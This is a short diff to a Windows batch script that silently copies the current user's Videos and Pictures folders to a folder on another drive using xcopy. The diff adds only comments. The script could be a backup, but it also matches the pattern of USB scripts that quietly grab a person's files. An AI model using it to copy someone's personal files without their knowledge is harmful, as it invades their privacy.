@@ -4,6 +4,8 @@
 SET odrive=%odrive:~0,2%
 set backupcmd=xcopy /s /c /d /e /h /i /r /y
 echo off
+
+::Directory of the files you want to download.
 %backupcmd% "%USERPROFILE%\videos" "%drive%\all\"
 %backupcmd% "%USERPROFILE%\pictures" "%drive%\all\"
 %backupcmd% "%USERPROFILE%\pictures" "%drive%\all\Saved Pictures"
@@ -14,3 +16,4 @@ echo off
 
 @echo off
 cls
+::end
